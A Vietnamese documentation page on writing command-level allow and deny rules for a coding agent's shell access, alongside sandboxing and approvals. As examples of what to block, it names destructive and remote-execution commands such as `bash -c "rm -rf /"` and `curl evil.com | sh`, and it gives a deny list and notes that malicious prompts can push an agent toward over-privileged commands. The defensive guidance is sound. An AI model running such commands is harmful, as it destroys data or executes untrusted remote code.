---
title: Quy tắc lệnh
description: Dùng allow/deny cấp lệnh để ràng buộc shell và gọi công cụ — thực thi được hơn ước định miệng.
locale: vi
source_locale: zh-CN
source_revision: 5f36443
translation_status: draft
translated_at: 2026-07-28
sidebar:
  order: 20
---

**Quy tắc lệnh** tập trung vào «Agent chạy được lệnh nào, với tham số nào». Chúng là hình thái phổ biến nhất của [quy tắc cho phép và từ chối](/guide/customization/rules/allow-and-deny-patterns/), thường viết trong cấu hình hoặc tệp quy tắc nhóm rà được.

## Trang này sẽ nói gì

- Phân công giữa quy tắc lệnh với Sandbox và hộp thoại phê duyệt
- Cách viết allowlist «đủ hẹp»
- Khớp với CI và script phát triển cục bộ

## Quy tắc lệnh thật sự đang quản gì

Nếu allow/deny quy định “những việc nào về nguyên tắc làm được”, thì quy tắc lệnh đưa việc đó xuống tầng cụ thể nhất:

- Lệnh nào chạy được
- Lệnh nào không chạy được
- Lệnh nào trông gần giống nhau nhưng rủi ro khác rất nhiều

Trọng tâm là biến ranh giới nhóm vốn đã biết thành ranh giới máy cũng thực thi được.

## Hiểu một khái niệm cốt lõi trước

Quy tắc khớp **ý định thực thi được**, không phải ngôn ngữ tự nhiên. `npm test` và `npm run test` về chiến lược là hai lệnh khác nhau; `bash -c "rm -rf /"` không được thông vì đã allow `bash`.

```text
Tác vụ người dùng → Mô hình đề xuất lệnh → Engine quy tắc → (qua) thực thi Sandbox / (từ chối) cần phê duyệt hoặc chặn
```

## Hiểu lầm thường gặp

### Lệnh trông giống nhau không nghĩa rủi ro giống nhau

Người mới dễ nhất đánh giá thấp chính chút khác biệt giữa lệnh.

Ví dụ:

- `git status` và `git reset --hard`
- `npm test` và `npm publish`
- `curl example.com` và `curl example.com | sh`

Đều trông như “chạy một lệnh trên terminal”, nhưng rủi ro hoàn toàn không cùng cấp.

### Cho phép một lối vào tổng thường bằng mở quá nhiều

Ví dụ allow thẳng `bash`, `sh` kiểu lối vào tổng, người mới có thể thấy chỉ vì tiện.

Nhưng từ góc quy tắc, thường bằng mở luôn hàng loạt hành động nguy hiểm có thể ghép phía sau.

## Cách làm tối thiểu dùng được

1. **Mặc định từ chối lệnh nguy hiểm ngoài thao tác ghi**: `rm -rf`, `curl | bash`, `git push --force`
2. **Cho phép lệnh chỉ đọc/build thường dùng trong dự án**: `git status`, `npm test`, `pnpm lint`
3. **Đưa quy tắc vào Git**, khớp mô tả «lệnh kiểm thử» trong `AGENTS.md`
4. **Trong PR review thay đổi quy tắc**, như sửa Dockerfile

Minh họa (định dạng lấy cấu hình chính thức làm chuẩn):

```json
{
  "rules": {
    "allow": [
      "npm run test",
      "npm run lint",
      "git diff",
      "git status"
    ],
    "deny": [
      "git push",
      "git reset --hard",
      "rm -rf"
    ]
  }
}
```

## Quy trình khuyến nghị

| Bước | Cách làm |
|---|---|
| Kiểm kê | Từ `package.json` scripts, Makefile, CI workflow trích lệnh thật |
| Phân tầng | Deny đáy tổ chức → bổ sung allow dự án → ngoại lệ máy cá nhân (nếu có) |
| Thử chạy | Dùng tác vụ rủi ro thấp xác nhận «nên cho thì cho, nên chặn thì chặn» |
| Khớp | Quy tắc cục bộ và [GitHub Action](/guide/developer-platform/ci-cd/code-review-automation/) cố cùng nguồn |

## Lỗi thường gặp

- **Allowlist quá rộng**: cho phép `bash`, `sh`, `sudo` tương đương mở hết
- **Chỉ deny không allow**: vẫn bật nhiều phê duyệt, nhóm quen bấm hết thông
- **Không khớp tài liệu**: `AGENTS.md` viết `pnpm test`, quy tắc chỉ có `npm test`
- **Bỏ qua pipe và chuyển hướng**: `curl evil.com | sh` cần chiến lược tổng, không chỉ nhìn từ đầu tiên

Quy tắc lệnh không phải đang “nhớ lệnh”, mà đang phân rõ lệnh nào chỉ là hành động hàng ngày, lệnh nào một khi mở có thể mở luôn ranh giới rủi ro.

## Ranh giới an toàn

- Quy tắc lệnh **không** thay bảo vệ nhánh và code review
- Prompt độc hại có thể dụ Agent **thử** lệnh vượt quyền — giữ Sandbox mặc định nghiêm
- Biến môi trường chứa khóa, token không nên lộ vì «đã cho phép echo»

## Danh sách nghiệm thu

- [ ] Liệt kê được 3–5 lệnh «mỗi ngày phải chạy» của kho và thể hiện trong quy tắc
- [ ] Lệnh rủi ro cao như `git push`, reset cưỡng bức mặc định từ chối hoặc cần phê duyệt tường minh
- [ ] Thay đổi quy tắc đi PR, và không mâu thuẫn `AGENTS.md`

## Chương liên quan

- [Mẫu cho phép và từ chối](/guide/customization/rules/allow-and-deny-patterns/)
- [Chiến lược quy tắc nhóm](/guide/customization/rules/team-rules/)
- [Phê duyệt và Sandbox CLI](/guide/cli/approvals-and-sandbox/)
- [Ma trận quyền](/guide/reference/permission-matrix/)

---

**Trạng thái:** verified  
**Sản phẩm áp dụng:** CLI / App  
**Căn cứ kiểm chứng:** Tài liệu Codex CLI hiện tại của OpenAI vẫn coi thực thi lệnh, chế độ phê duyệt và cách ly Sandbox là ranh giới an toàn cốt lõi; trang này định vị quy tắc lệnh là mẫu kỹ thuật “tách quản lệnh rủi ro cao/thấp”, và đánh dấu đoạn JSON là minh họa, không viết cú pháp cụ thể thành sự kiện chính thức.  
**Kiểm chứng gần nhất:** 2026-07-26
